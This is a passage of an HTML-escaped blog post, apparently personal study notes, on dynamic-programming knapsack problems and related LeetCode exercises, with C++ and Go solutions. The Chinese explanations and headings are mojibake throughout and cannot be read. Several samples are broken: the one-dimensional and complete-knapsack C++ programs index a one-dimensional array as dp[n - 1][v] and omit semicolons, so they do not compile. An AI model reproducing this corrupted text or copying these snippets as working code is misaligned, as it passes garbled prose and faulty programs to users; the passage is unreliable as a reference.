style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.66666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int numTrees(int n) {
        int dp[20];
        memset(dp, 0, sizeof(dp));
        dp[0] = 1;
        for (int i = 1; i &amp;lt;= n; i++) {
            for (int j = 1; j &amp;lt;= i; j++) {
                dp[i] += dp[i - j] * dp[j - 1];
            }
        }
        return dp[n];
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;èƒŒåŒ…é—®é¢˜&#34;&gt;èƒŒåŒ…é—®é¢˜&lt;/h1&gt;
&lt;p&gt;èƒŒåŒ…é—®é¢˜åŸºæœ¬ä¸Šææ‡‚01èƒŒåŒ…ï¼Œå®Œå…¨èƒŒåŒ…å°±å·®ä¸å¤šå¤Ÿäº†ï¼Œæœ€å¤šå†åŠ ä¸Šä¸€ä¸ªå®Œå…¨èƒŒåŒ…ï¼Œå…¶ä»–çš„èƒŒåŒ…é—®é¢˜éƒ½æ˜¯ç«èµ›çº§åˆ«çš„äº†ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://camo.githubusercontent.com/5c5af3f54a3503cdb989ab1c28e2933202a33259608c70af0e72db5a858f14e6/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f32303231303131373137313330373430372e706e67&#34; alt=&#34;416.åˆ†å‰²ç­‰å’Œå­é›†1&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;01èƒŒåŒ…&#34;&gt;01èƒŒåŒ…&lt;/h2&gt;
&lt;p&gt;https://www.acwing.com/problem/content/2/&lt;/p&gt;
&lt;p&gt;01èƒŒåŒ…å°±æ˜¯å°†1~nç‰©å“ä¸­è‹¥å¹²ä¸ªè£…è¿›å®¹é‡ä¸ºWçš„èƒŒåŒ…ä¸­ï¼Œæ¯ä»¶ç‰©å“çš„é‡é‡ä¸ºweight[i]ï¼Œä»·å€¼ä¸ºvalue[i]ã€‚&lt;/p&gt;
&lt;h3 id=&#34;äºŒç»´dp&#34;&gt;äºŒç»´dp&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;dp[i][j]&lt;/code&gt;è¡¨ç¤ºå‰iä»¶è£…è¿›èƒŒåŒ…å®¹é‡ä¸ºjçš„èƒŒåŒ…ä¸­çš„æœ€å¤§ä»·å€¼ï¼Œå¯ä»¥æœ‰ä¸¤ä¸ªæ–¹å‘å»æ¨å‡º&lt;code&gt;dp[i][j]&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä¸æ”¾å½“å‰ç¬¬iä¸ªç‰©å“ï¼Œå³&lt;code&gt;dp[i][j] = dp[i-1][j]&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;æ”¾å½“å‰ç¬¬iä¸ªç‰©å“ï¼Œå³&lt;code&gt;dp[i][j] = dp[i-1][j-wight[i]] + value[i]&lt;/code&gt;ï¼Œå¦‚æœæ”¾ç¬¬iä¸ªç‰©å“ï¼Œé‚£ä¹ˆéœ€è¦ä¸ºèƒŒåŒ…è…¾å‡ºwight[i]ä¸ºä½ç½®ï¼Œå³&lt;code&gt;j-wight[i]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ‰€ä»¥é€’æ¨å…¬å¼ä¸ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dp[i][j] = max(dp[i-1][j], dp[i-1][j-weight[i]] + value[i])&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;åˆå§‹åŒ–ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;dp[i][0] = 0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;å½“&lt;code&gt;j&amp;lt;weight[0]&lt;/code&gt;ï¼Œä¹Ÿå°±æ˜¯å½“èƒŒåŒ…å®¹é‡å°äºæœ€å°ç‰©å“æ—¶ï¼Œ&lt;code&gt;dp[0][j]=0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;å½“&lt;code&gt;j&amp;gt;=weight[0]&lt;/code&gt;ï¼Œ&lt;code&gt;dp[0][j] =  value[0]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;cstring&amp;gt;

using namespace std;

const int N = 1005;

int main() {
    int n, v;
    int dp[N][N];
    int weight[N];
    int value[N];
    memset(dp, 0, sizeof(dp));
    
    scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;n, &amp;amp;v);
    for (int i = 0; i &amp;lt; n; i ++) {
        scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;weight[i], &amp;amp;value[i]);
    }
    
    for (int j = weight[0]; j &amp;lt;= v; j ++) {
        dp[0][j] = value[0];
    }
    
    for (int i = 1; i &amp;lt; n; i++) {
        for (int j = 0; j &amp;lt;= v; j++) {
            if(j &amp;gt;= weight[i])
                dp[i][j] = max(dp[i - 1][j], dp[i - 1][j - weight[i]] + value[i]);
            else
                dp[i][j] = dp[i - 1][j];
        }
    }
    cout &amp;lt;&amp;lt; dp[n - 1][v];
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ä¸€ç»´dp&#34;&gt;ä¸€ç»´dp&lt;/h3&gt;
&lt;p&gt;ä»äºŒç»´dpçš„é€’æ¨å…¬å¼ä¸­å¯ä»¥çœ‹å‡ºæ¯æ¬¡è¿­ä»£éƒ½ä¸å‰ä¸€è¡Œæœ‰å…³ï¼Œå…¶å®å¯ä»¥å°†i-1è¡Œå åŠ åˆ°iè¡Œï¼Œé‚£ä¹ˆå°±å¯ä»¥åªç”¨ä¸€ä¸ªæ•°ç»„ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€ç»´dp[j]çš„å«ä¹‰æ—¶ï¼Œå®¹é‡ä¸ºjçš„èƒŒåŒ…ï¼Œæœ€å¤§ä»·å€¼æ˜¯dp[j]ã€‚&lt;/p&gt;
&lt;p&gt;æ­¤æ—¶é€’æ¨å…¬å¼ï¼š&lt;code&gt;dp[j] = max(dp[j], dp[j-weight[i]] + value[i])&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;åˆå§‹åŒ–ï¼šå¦‚æœæ‰€æœ‰çš„ä»·å€¼éƒ½æ˜¯æ­£æ•°ï¼Œé‚£ä¹ˆå¯ä»¥å…¨éƒ¨åˆå§‹åŒ–ä¸º0ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;cstring&amp;gt;

using namespace std;

const int N = 1005;

int main() {
    int n, v;
    int dp[N];
    int weight[N];
    int value[N];
    memset(dp, 0, sizeof(dp));
    
    scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;n, &amp;amp;v);
    for (int i = 0; i &amp;lt; n; i ++) {
        scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;weight[i], &amp;amp;value[i]);
    }
    
    for (int i = 0; i &amp;lt; n; i++) {
        for (int j = v; j &amp;gt;= weight[i]; j--) {
            dp[j] = max(dp[j], dp[j-weight[i]] + value[i])
        }
    }
    cout &amp;lt;&amp;lt; dp[n - 1][v];
}



// go
package main

import &amp;quot;fmt&amp;quot;

func max(x, y int) int {
	if x &amp;gt; y {
		return x
	}
	return y
}

func main() {
	var n, v int
	var weight, value []int
	var dp []int
	fmt.Scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;n, &amp;amp;v)

	for i := 0; i &amp;lt; n; i++ {
		weight = append(weight, 0)
		value = append(value, 0)
		fmt.Scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;weight[i], &amp;amp;value[i])
	}

	for i := 0; i &amp;lt;= v; i++ {
		dp = append(dp, 0)
	}

	for i := 0; i &amp;lt; n; i++ {
		for j := v; j &amp;gt;= weight[i]; j-- {
			dp[j] = max(dp[j], dp[j - weight[i]] + value[i])
		}
	}
	fmt.Printf(&amp;quot;%v\n&amp;quot;, dp)
	fmt.Println(dp)
	fmt.Printf(&amp;quot;%d\n&amp;quot;, dp[v])
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸€ç»´dpçš„è¿­ä»£å†™æ³•å’ŒäºŒç»´dpçš„å†™æ³•æ˜¯ä¸ä¸€æ ·çš„ï¼ŒäºŒç»´dpéå†çš„æ—¶å€™ï¼ŒèƒŒåŒ…å®¹é‡æ˜¯ä»å°åˆ°å¤§çš„ï¼Œè€Œä¸€ç»´dpéå†çš„æ—¶å€™ï¼ŒèƒŒåŒ…æ˜¯ä»å¤§åˆ°å°çš„ã€‚è¿™æ˜¯å› ä¸ºå€’åºæ˜¯ä¸ºäº†ä¿è¯ç‰©å“iåªè¢«æ”¾å…¥ä¸€æ¬¡ã€‚&lt;/p&gt;
&lt;h3 id=&#34;åˆ†å‰²ç­‰å’Œå­é›†&#34;&gt;åˆ†å‰²ç­‰å’Œå­é›†&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/partition-equal-subset-sum/&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜çœ‹ä¼¼æ˜¯å›æº¯æœç´¢é—®é¢˜ï¼Œä½†å…¶å®æ˜¯èƒŒåŒ…é—®é¢˜ï¼Œé—®é¢˜å¯ä»¥è½¬åŒ–ä¸ºæ‰¾åˆ°ä¸€ä¸ªå­é›†ï¼Œè¯¥å­é›†ä¸­å…ƒç´ çš„å’Œä¸ºæ•´ä¸ªæ•°ç»„çš„å’Œçš„ä¸€åŠï¼Œæ‰¾å­é›†çš„è¿‡ç¨‹å…¶å®å°±æ˜¯ä¸€ä¸ª01èƒŒåŒ…é—®é¢˜ï¼Œåªä¸è¿‡æ¯ä¸ªå…ƒç´ çš„weightå’Œvalueå€¼ç›¸ç­‰ï¼Œå¯¹äºæ¯ä¸ªå…ƒç´ åªæœ‰å–å’Œä¸å–ä¸¤ä¸ªé€‰æ‹©ï¼ŒèƒŒåŒ…å®¹é‡å°±æ˜¯sum/2ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    bool canPartition(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        int sum = 0;
        
        for (int i = 0; i &amp;lt; nums.size(); i ++) {
            sum += nums[i];
        }
        if(sum % 2 != 0) return false;
        
        vector&amp;lt;int&amp;gt; dp(sum / 2 + 1, 0);
        
        for (int i = 0; i &amp;lt; nums.size(); i++) {
            for (int j = sum / 2; j &amp;gt;= nums[i]; j--) {
                dp[j] = max(dp[j], dp[j - nums[i]] + nums[i]);
            }
        }
        
        if (dp[sum / 2] == sum / 2) 
            return true;
        
        return false;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;æœ€åä¸€å—çŸ³å¤´çš„é‡é‡-ii&#34;&gt;æœ€åä¸€å—çŸ³å¤´çš„é‡é‡ II&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/last-stone-weight-ii/&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜å…¶å®å°±æ˜¯å°½é‡è®©çŸ³å¤´åˆ†æˆé‡é‡å°½å¯èƒ½ç›¸è¿‘ç›¸åŒçš„ä¸¤å †ï¼Œè¿™æ ·ä¸¤å †ä¹‹é—´ç›¸æ’ä¹‹åå‰©ä¸‹çš„çŸ³å¤´æœ€å°ï¼Œç»“æœå°±æ˜¯ä¸¤å †çš„å·®å€¼ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func max(x, y int) int {
    if x &amp;gt; y {
        return x
    }
    return y
}

func lastStoneWeightII(stones []int) int {
    var dp [3005] int
    var sum int = 0

    for i := 0; i &amp;lt; len(stones); i++ {
        sum += stones[i]
    }

    for i := 0; i &amp;lt; len(stones); i++ {
        for j := sum / 2; j &amp;gt;= stones[i]; j-- {
            dp[j] = max(dp[j], dp[j - stones[i]] + stones[i])
        }
    }

    return sum - dp[sum / 2] * 2
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ä¸€å’Œé›¶&#34;&gt;ä¸€å’Œé›¶&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/ones-and-zeroes/&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜å…¶å®æ˜¯01èƒŒåŒ…é—®é¢˜ï¼Œåªä¸è¿‡æ˜¯äºŒç»´çš„01èƒŒåŒ…ï¼Œå¯ä»¥æƒ³æˆæœ‰ä¸¤ä¸ªèƒŒåŒ…ï¼Œæ¯æ¬¡é€‰ä¸€ä¸ªç‰©å“ï¼Œä¸¤ä¸ªèƒŒåŒ…éƒ½ä¼šå‡å»ç›¸åº”çš„å®¹é‡ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int findMaxForm(vector&amp;lt;string&amp;gt;&amp;amp; strs, int m, int n) {
        int dp[101][101];
        memset(dp, 0, sizeof(dp));
        for (int i = 0; i &amp;lt; strs.size(); i ++) {
            int zero = 0;
            for (int j = 0; j &amp;lt; strs[i].length(); j++) {
                if (strs[i][j] == &#39;0&#39;) zero ++;
            }
            int one = strs[i].length() - zero;
            for (int j = m; j &amp;gt;= zero; j--) {
                for (int k = n; k &amp;gt;= one; k--) {
                    dp [j][k] = max(dp[j][k], dp[j - zero][k - one] + 1);
                }
            }
        }
        return dp[m][n];
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ç›®æ ‡å’Œ&#34;&gt;ç›®æ ‡å’Œâ€»&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/target-sum/&lt;/p&gt;
&lt;p&gt;å‡è®¾åŠ æ³•çš„æ€»å’Œä¸ºxï¼Œé‚£ä¹ˆå‡æ³•å¯¹åº”çš„æ€»å’Œå°±æ˜¯sum-xï¼Œæ‰€ä»¥è¦æ±‚&lt;code&gt;x-(sum-x)=targetï¼Œx = (target + sum) / 2&lt;/code&gt;ï¼Œé—®é¢˜è½¬åŒ–ä¸ºäº†é€‰æ‹©è‹¥å¹²ä¸ªæ•°ï¼Œå’Œä¸ºxï¼Œå…¶å®è½¬åŒ–ä¸ºä¸€ä¸ªç»„åˆé—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;åŒæ—¶æ³¨æ„å¦‚æœtarget + sumä¸ºå¥‡æ•°åˆ™æ²¡æœ‰è§£ï¼Œtarget&amp;gt;sumä¹Ÿæ²¡æœ‰è§£ã€‚&lt;/p&gt;
&lt;p&gt;å¯¹äºæ‰€æœ‰ç»„åˆé—®é¢˜ï¼ŒèƒŒåŒ…çš„é€’æ¨ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;dp[j] += dp[j-nums[i]]
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int findTargetSumWays(vector&amp;lt;int&amp;gt;&amp;amp; nums, int S) {
        int sum = 0;
        for (int i = 0; i &amp;lt; nums.size(); i++) sum += nums[i];
        if (abs(S) &amp;gt; sum) return 0; // æ­¤æ—¶æ²¡æœ‰æ–¹æ¡ˆ
        if ((S + sum) % 2 == 1) return 0; // æ­¤æ—¶æ²¡æœ‰æ–¹æ¡ˆ
        int bagSize = (S + sum) / 2;
        vector&amp;lt;int&amp;gt; dp(bagSize + 1, 0);
        dp[0] = 1;
        for (int i = 0; i &amp;lt; nums.size(); i++) {
            for (int j = bagSize; j &amp;gt;= nums[i]; j--) {
                dp[j] += dp[j - nums[i]];
            }
        }
        return dp[bagSize];
    }
};

// æ²¡å®Œå…¨æ‡‚
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;å®Œå…¨èƒŒåŒ…&#34;&gt;å®Œå…¨èƒŒåŒ…&lt;/h2&gt;
&lt;p&gt;å®Œå…¨èƒŒåŒ…é—®é¢˜ä¸01èƒŒåŒ…çš„é—®é¢˜åŒºåˆ«å°±æ˜¯æ¯ä»¶ç‰©å“éƒ½å¯ä»¥æœ‰æ— é™ä¸ªã€‚&lt;/p&gt;
&lt;p&gt;éå†é¡ºåºå˜ä¸€ä¸‹å°±å¥½ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;cstring&amp;gt;

using namespace std;

const int N = 1005;

int main() {
    int n, v;
    int dp[N];
    int weight[N];
    int value[N];
    memset(dp, 0, sizeof(dp));
    
    scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;n, &amp;amp;v);
    for (int i = 0; i &amp;lt; n; i ++) {
        scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;weight[i], &amp;amp;value[i]);
    }
    
    for (int i = 0; i &amp;lt; n; i++) {
        for (int j = weight[i]; j &amp;lt;= v; j++) { // è¿™é‡Œä»å°åˆ°å¤§
            dp[j] = max(dp[j], dp[j-weight[i]] + value[i])
        }
    }
    cout &amp;lt;&amp;lt; dp[n - 1][v];
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ä¸¤å±‚forå¾ªç¯çš„å†…å¤–å±‚å¯ä»¥äº’æ¢ï¼Œç»“æœæ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯é€šå¸¸é¢˜ç›®éƒ½ä¼šå˜ä¸€å˜ï¼Œæ¯”å¦‚è£…æ»¡èƒŒåŒ…å¯ä»¥æœ‰å‡ ç§æ–¹æ³•ï¼Œè¿™æ—¶å€™å†…å¤–å±‚äº’æ¢å°±æœ‰åŒºåˆ«äº†ã€‚&lt;/p&gt;
&lt;h3 id=&#34;é›¶é’±å…‘æ¢-ii&#34;&gt;é›¶é’±å…‘æ¢ II&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/coin-change-2/&lt;/p&gt;
&lt;p&gt;è¿™æ˜¯ä¸€é“å¤šé‡èƒŒåŒ…é—®é¢˜ã€ç„¶åè½¬åŒ–ä¸ºç»„åˆé—®é¢˜&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func max(x, y int) int {
    if x &amp;gt; y {
        return x
    }
    return y
}

func change(amount int, coins []int) int {
    var dp [5005] int
    dp[0] = 1

    for i := 0; i &amp;lt; len(coins); i++ {
        for j := coins[i]; j &amp;lt;= amount; j++ {
            dp[j] += dp[j - coins[i]]
        }
    }
    return dp[amount]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;è¿™é“é¢˜æœ€åè®©æ±‚ç»„åˆæ•°ï¼Œå³é€‰æ‹©ç‰©å“æ˜¯æ²¡æœ‰é¡ºåºçš„ï¼Œæ‰€ä»¥å¤–å±‚å¿…é¡»ä¸ºéå†ç‰©å“ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å¦‚æœå†…å±‚éå†ç‰©å“ï¼Œæ¯ä»¶ç‰©å“éœ€è¦è¢«éå†å¤šæ¬¡ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™ç›¸å½“äºæ¯æ¬¡çš„é€‰æ‹©é¡ºåºéƒ½æœ‰äº†ï¼Œæ»¡è¶³æ¡ä»¶çš„éƒ½ä¼šè¢«è®°å½•ä¸‹æ¥ï¼Œæ¯”å¦‚é€‰1,2å’Œé€‰2,1éƒ½ä¼šè¢«è®°å½•ä¸‹æ¥ï¼Œè€Œç»„åˆé—®é¢˜ä¸­è¿™ä¸¤ç§é€‰æ‹©æ˜¯ä¸€ä¸ªç­”æ¡ˆã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ‰€ä»¥éå†èƒŒåŒ…æ”¾åœ¨å¤–å±‚æ˜¯ä¸€ä¸ªç»„åˆé—®é¢˜ï¼Œæ”¾åœ¨å†…å±‚æ˜¯ä¸€ä¸ªæ’åˆ—é—®é¢˜ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;ç»„åˆæ€»å’Œiv&#34;&gt;ç»„åˆæ€»å’Œâ…£&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/combination-sum-iv/&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜é¢˜ç›®è¯´æ˜¯ç»„åˆï¼Œä½†æ ¹æ®é¢˜ç›®æè¿°ï¼Œå¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€é“æ’åˆ—é¢˜ï¼Œå¹¶éæˆ‘ä»¬å¸¸è§„è®¤ä¸ºçš„æ’åˆ—ï¼Œè€Œæ˜¯éœ€è¦æ»¡è¶³é¢˜ç›®è¦æ±‚ï¼ŒåŒæ—¶é€‰æ‹©çš„é¡ºåºä¸åŒç®—ä½œæ˜¯å¤šç§ç­”æ¡ˆã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å› æ­¤éœ€è¦å°†ç‰©å“çš„éå†é¡ºåºæ”¾åœ¨å†…å±‚å¾ªç¯ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func combinationSum4(nums []int, target int) int {
    var dp [1005] int
    dp[0] = 1
    
    for j := 0; j &amp;lt;= target; j++ {
        for i := 0; i &amp;lt; len(nums); i++ {
            if j &amp;gt;= nums[i] {
                dp[j] += dp[j - nums[i]]
            }
        }
    }
    return dp[target]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;mé˜¶çˆ¬æ¥¼æ¢¯&#34;&gt;mé˜¶çˆ¬æ¥¼æ¢¯&lt;/h3&gt;
&lt;p&gt;è¿™é“çˆ¬æ¥¼æ¢¯é—®é¢˜https://leetcode-cn.com/problems/min-cost-climbing-stairs/submissions/é™åˆ¶äº†æ¯æ¬¡åªèƒ½è·¨1é˜¶æˆ–2é˜¶æ¥¼æ¢¯ï¼Œé‚£å¦‚æœæ”¹æˆï¼Œæ¯æ¬¡å¯ä»¥è·¨1é˜¶ã€2é˜¶...mé˜¶ï¼Œå¯ä»¥æœ‰å¤šå°‘ç§çˆ¬æ¥¼æ¢¯çš„æ–¹æ³•ã€‚&lt;/p&gt;
&lt;p&gt;å…¶å®è¿™å°±æ˜¯ä¸€é“å®Œå…¨èƒŒåŒ…é—®é¢˜ï¼ŒæŠŠ1,2,3,4,...,mçœ‹æˆæ˜¯ç‰©å“çš„ä½“ç§¯ï¼Œæ¥¼é¡¶å°±æ˜¯èƒŒåŒ…å®¹é‡ï¼Œæ¯ä¸ªç‰©å“æ˜¯å¯ä»¥é‡å¤é€‰çš„ï¼Œå˜æˆäº†ä¸€é“è€ƒå¯Ÿæ’åˆ—çš„å®Œå…¨èƒŒåŒ…é—®é¢˜ã€‚åŒæ ·çš„ï¼Œéœ€è¦æŠŠç‰©å“éå†æ”¾åœ¨å†…å±‚å¾ªç¯ã€‚&lt;/p&gt;
&lt;h3 id=&#34;é›¶é’±å…‘æ¢&#34;&gt;é›¶é’±å…‘æ¢&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/coin-change/&lt;/p&gt;
&lt;p&gt;æ¯ä¸ªç‰©å“ä¸é™æ¬¡æ•°ï¼Œå¯ä»¥çœ‹å‡ºæ˜¯å®Œå…¨èƒŒåŒ…é—®é¢˜ï¼Œæœ€ç»ˆæ±‚å‡ºå¡«æ»¡èƒŒåŒ…ï¼Œéœ€è¦æœ€å°‘çš„ç‰©å“çš„æ•°é‡ï¼Œå¦‚æœä¸èƒ½å¡«æ»¡ï¼Œåˆ™è¾“å‡º-1ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;å®šä¹‰dp[j]è¡¨ç¤ºå¡«æ»¡èƒŒåŒ…å®¹é‡ä¸ºjéœ€è¦çš„æœ€å°‘ç‰©å“æ•°é‡ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;dp[j]åªæœ‰ä¸€ä¸ªæ¥æºï¼Œå³dp[j-coins[i]]ï¼Œdp[j]è¦å–æ‰€æœ‰dp[j-coins[i]]+1å½“ä¸­æœ€å°çš„ï¼Œé€’æ¨å…¬å¼&lt;code&gt;dp[j] = min(dp[j], dp[j-coins[i]] + 1)&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;åˆå§‹åŒ–ï¼šdp[j]è¦å®šä¹‰ä¸ºä¸€ä¸ªæœ€å¤§çš„æ•°ï¼Œåœ¨è¿™é‡Œå®šä¹‰ä¸ºamount+1å°±å·²ç»å¤Ÿå¤§äº†ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;éå†é¡ºåºï¼šæ±‚é’±å¸çš„æœ€å°æ•°ç›®ï¼Œé’±å¸æœ‰æ— é¡ºåºéƒ½æ— æ‰€è°“ã€‚å†…å¤–å±‚äº’æ¢ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func min(x, y int) int {
    if x &amp;lt; y {
        return x
    }
    return y
}

func coinChange(coins []int, amount int) int {
    var dp [10005] int

    for i := 1; i &amp;lt;= amount; i++ {
        dp[i] = amount + 1
    }
    
